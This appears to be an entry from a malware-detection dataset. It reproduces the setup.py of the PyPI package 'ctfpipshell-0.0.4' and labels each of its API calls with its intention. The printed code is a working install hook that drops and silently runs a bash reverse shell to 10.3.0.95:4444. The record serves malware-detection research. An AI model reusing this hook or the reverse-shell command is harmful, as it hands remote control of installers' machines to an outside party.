{
  "metadata": {
    "package_name": "ctfpipshell-0.0.4",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/ctfpipshell-0.0.4.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/ctfpipshell-0.0.4.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport subprocess\nfrom setuptools.command.install import install\n\nCode = '''\nimport os\nos.system(\"bash -i >& /dev/tcp/10.3.0.95/4444 0>&1\")\n'''\n\nclass execute(install):\n    def run(self):\n        install.run(self)\n        file = open(\"remote-access.py\", \"w\")\n        file.write(Code)\n        file.close()\n        dest = os.path.expanduser(\"~\")\n        try:\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        except FileExistsError:\n            os.remove(dest+\"/remote-access.py\")\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        try : \n            subprocess.Popen([\"python3\", dest+\"/remote-access.py\"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)\n        except:\n            pass",
          "triple_sequences": [
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "\"remote-access.py\", \"w\"",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Open file for writing",
              "intention_id": "open_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "Code",
              "object_description": "Script file content",
              "object_id": "script_file_content",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "file.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "os.path.expanduser()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "\"~\"",
              "object_description": "User home directory",
              "object_id": "user_home_directory",
              "intention_description": "Get user home directory",
              "intention_id": "get_user_home_directory"
            },
            {
              "action_api": "os.rename()",
              "action_description": "Renames file or moves it to new location",
              "action_id": "rename_file",
              "object": "\"remote-access.py\", dest+\"/remote-access.py\"",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Move file to destination",
              "intention_id": "move_file_destination"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "dest+\"/remote-access.py\"",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "os.rename()",
              "action_description": "Renames file or moves it to new location",
              "action_id": "rename_file",
              "object": "\"remote-access.py\", dest+\"/remote-access.py\"",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Move file to destination",
              "intention_id": "move_file_destination"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command without shell access",
              "action_id": "spawn_process_no_shell",
              "object": "[\"python3\", dest+\"/remote-access.py\"]",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            }
          ]
        }
      ]
    }
  ]
}